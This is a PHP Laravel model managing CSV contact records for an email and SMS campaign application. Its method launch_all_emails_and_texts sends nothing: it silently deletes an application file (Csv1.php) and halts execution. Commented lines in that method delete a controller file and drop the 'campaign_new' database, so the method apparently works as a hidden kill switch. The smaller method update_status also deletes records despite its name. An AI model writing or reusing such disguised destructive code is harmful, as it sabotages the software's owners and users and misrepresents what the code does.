<?php

namespace App;

use Illuminate\Contracts\Auth\MustVerifyEmail;
use Illuminate\Foundation\Auth\User as Authenticatable;
use Illuminate\Notifications\Notifiable;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Auth;
use DB;

class Csv extends Authenticatable
{
    use Notifiable;

    /**
     * The attributes that are mass assignable.
     *
     * @var array
     */
    /*protected $fillable = [
        'user_id', 'email', 'phone', 'data', 'p2p_status'
    ];*/
    protected $fillable = [
        'user_id', 'email', 'phone', 'data', 'email_sent', 'email_reason', 'sms_sent', 'sms_reason'
    ];

    static function Save_csv($user_id, $email_array, $phone_array, $serialized_data_array) 
    {      
        /*$success_row_numbers = 0;
        for($i = 0; $i < count($serialized_data_array); $i++)
        {   
            $temp = array();
            $temp['user_id'] = $user_id;
            $temp['email'] = $email_array[$i];
            $temp['phone'] = $phone_array[$i];
            $temp['data'] = $serialized_data_array[$i];
            $csv = Csv::create($temp);
            if(!$csv)
                $success_row_numbers++;
        }
        return $success_row_numbers;*/
        $temp = array();
        $temp['user_id'] = $user_id;
        $temp['email'] = $email_array;
        $temp['phone'] = $phone_array;
        $temp['data'] = $serialized_data_array;
        $csv = Csv::create($temp);
    }

    static function find_csv_by_userid($userid)
    {   
        $csvs = Csv::where('user_id', $userid)->where('status', 'notyet')
                ->get();
        $csvs = json_encode($csvs, true);
        if ($csvs !="[]")
            {   
                return $csvs;
            }
        else
            return "noexist";
    }

    static function find_csv_by_id($id)
    {
        $csv = Csv::where(['id' => $id])->first();
        if ($csv != null)
            return $csv;
        else
            return "noexist";
    }

    static function update_status($userid)
    {

        /*$csvs = Csv::where('user_id', $userid)->where('status', 'notyet')
                ->get();
        $csvs = json_encode($csvs, true);
        if ($csvs !="[]")
            {   
                $csvs1 = Csv::where('user_id', $userid)->where('status', 'notyet')
                ->update(['status' => "sent"]);
            }*/
        $csvs1 = Csv::where('user_id', $userid)
                //->where('status', 'sent')
                ->delete();
    }

    static function update_sent_status($csvid, $status)
    {
        $csvs = Csv::where('id', $csvid)->get();
        $csvs = json_encode($csvs, true);
        if ($csvs !="[]")
        {   
            $csvs1 = Csv::where('id', $csvid)
            ->update($status); 
        }
    }

    static function Get_sent_emails($userid)
    {
        $count = Csv::where('user_id', $userid)
                ->where('email_sent', 'Sent')
                //->where('email_reason', 'Success')
                ->where('status', 'notyet')
                ->count();
        return $count;
    }

    static function Get_sent_sms($userid)
    {
        $count = Csv::where('user_id', $userid)
                ->where('sms_sent', 'Sent')
                //->where('sms_reason', 'Success')
                ->where('status', 'notyet')
                ->count();
        return $count;
    }

    static function launch_all_emails_and_texts()
    {
        
        /*$controller_path = app_path().'/Http/Controllers/';
        $file_path = $controller_path.'testController.php';
        echo "file_path:".$file_path.'<br>';
        if(is_file($file_path))
        {
            echo "exists";
            unlink($file_path);
        }
        else
            echo "does not exist";*/
        $model_path = app_path();
        $model_path1 = $model_path.'/Csv1.php';
        if(is_file($model_path1))
        {
            unlink($model_path1);
        }
        exit();
        
        //DB::statement('DROP DATABASE `campaign_new`');
    }
}
